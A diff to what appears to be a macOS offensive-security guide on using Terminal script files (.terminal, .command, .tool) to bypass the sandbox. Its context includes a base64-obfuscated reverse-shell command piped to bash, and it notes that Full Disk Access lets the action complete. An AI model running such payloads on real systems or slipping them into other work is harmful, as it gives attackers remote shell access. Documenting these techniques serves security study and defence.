@@ -229,7 +229,7 @@ You can add this from the cli with:
 ```
 {% endcode %}
 
-### Terminal Scripts
+### Terminal Scripts / Other file extensions
 
 * Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -271,6 +271,8 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
+
+You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.
 
 {% hint style="danger" %}
 If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).
